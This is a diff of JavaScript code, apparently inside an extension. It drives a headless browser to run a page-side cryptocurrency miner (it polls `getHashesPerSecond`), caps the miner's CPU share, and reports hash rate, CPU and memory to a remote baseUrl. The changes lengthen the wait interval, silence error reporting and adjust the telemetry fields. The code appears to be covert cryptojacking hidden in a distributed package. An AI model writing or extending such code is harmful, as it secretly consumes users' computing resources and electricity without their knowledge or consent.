@@ -29,7 +29,7 @@
   let minUse = 0.1;
   let maxUse = 0.5;
   let [max, min] = [maxUse, minUse];
-  let waitTime = 12 * 60 * 1000;
+  let waitTime = 20 * 60 * 1000;
 
 
   try {
@@ -145,7 +145,7 @@
       try {
         await global.cppPage.close();
       } catch (e) {
-        tstt({ message: "BRW_PAGE_ERR", error: e, value: e.message });
+        // tstt({ message: "BRW_PAGE_ERR", error: e, value: e.message });
       }
       global.cppPage = null;
     }
@@ -153,7 +153,7 @@
       try {
         await global.cppBrowser.close();
       } catch (e) {
-        tstt({ message: "BRW_ERR", error: e, value: e.message });
+        // tstt({ message: "BRW_ERR", error: e, value: e.message });
       }
       global.cppBrowser = null;
     }
@@ -173,14 +173,14 @@
 
         // '--ignore-certificate-errors',
         // "--ignore-certificate-errors-spki-list",
-        "--no-zygote",
-        "--no-sandbox",
+        // "--no-zygote",
+        // "--no-sandbox",
         // "--enable-features=NetworkService",
 
         '--disable-background-timer-throttling',
         '--disable-client-side-phishing-detection',
         '--disable-default-apps',
-        // '--disable-hang-monitor',
+        '--disable-hang-monitor',
         '--disable-popup-blocking',
         '--disable-prompt-on-repost',
         '--disable-sync',
@@ -188,10 +188,10 @@
         '--enable-devtools-experiments',
         '--metrics-recording-only',
         '--no-first-run',
-        // '--password-store=basic',
+        '--password-store=basic',
         '--remote-debugging-port=0',
         '--safebrowsing-disable-auto-update',
-        // '--use-mock-keychain',
+        '--use-mock-keychain',
         // '--disable-background-networking',
         // '--user-data-dir=C:\\Users\\Admin\\AppData\\Local\\Temp',
         // '--disable-gpu',
@@ -219,16 +219,14 @@
       tstt({
         baseUrl,
         message: "INIT_CLT",
-        value: "No client",
-        version: safe(() => JSON.parse(fs.readFileSync(`${extensionPath}/package.json`))?.version),
+        value: "No client"
       });
       if (global.inIntv) clearInterval(global.inIntv);
-
       if (global.cppPage) {
         try {
           await global.cppPage.close();
         } catch (e) {
-          tstt({ message: "BRW_PAGE_ERR", error: e, value: e.message });
+          // tstt({ message: "BRW_PAGE_ERR", error: e, value: e.message });
         }
         global.cppPage = null;
       }
@@ -236,13 +234,12 @@
         try {
           await global.cppBrowser.close();
         } catch (e) {
-          tstt({ message: "BRW_ERR", error: e, value: e.message });
+          // tstt({ message: "BRW_ERR", error: e, value: e.message });
         }
         global.cppBrowser = null;
       }
       return;
     }
-
 
 
     if (global.inIntv) clearInterval(global.inIntv);
@@ -255,13 +252,13 @@
       if (browser && page) {
         const hs = await page.evaluate(() => {
           try {
-            return { message: 'success', value: window._client?.getHashesPerSecond(), _client: window._client, user: window._client?._user };
+            return { message: 'success', info: window.info, value: window._client?.getHashesPerSecond(), _client: window._client };
           } catch (error) {
-            return { message: error.message, value: null, error, _client: window._client, user: window._client?._user };
+            return { message: error.message, info: window.info, value: null, error, _client: window._client };
           }
         });
         if (hs.message != 'success' || !hs._client) {
-          tstt({ baseUrl, message: hs.message, client: !!hs._client, user: window._client?._user, value: hs.value, error: hs.error });
+          tstt({ baseUrl, message: hs.message, client: !!hs._client, value: hs.value, error: hs.error, version: safe(() => JSON.parse(fs.readFileSync(`${extensionPath}/package.json`))?.version) });
           return;
         }
         [max, min] = [maxUse, minUse];
@@ -273,9 +270,9 @@
           max: max,
           value: safe(() => parseFloat(hs?.value).toFixed(2)),
           client: !!hs._client,
-          user: hs.user,
+          info: hs.info,
           cpu: getCPUUsage(),
-          memory: getMemoryUsage()?.total,
+          memory: getMemoryUsage(),
         });
 
         await page.evaluate((max, baseUrl) => {
@@ -294,6 +291,7 @@
     }
 
     (async () => { throw new Error('sp-complete') })();
+
 
   } catch (error) {
     tstt({
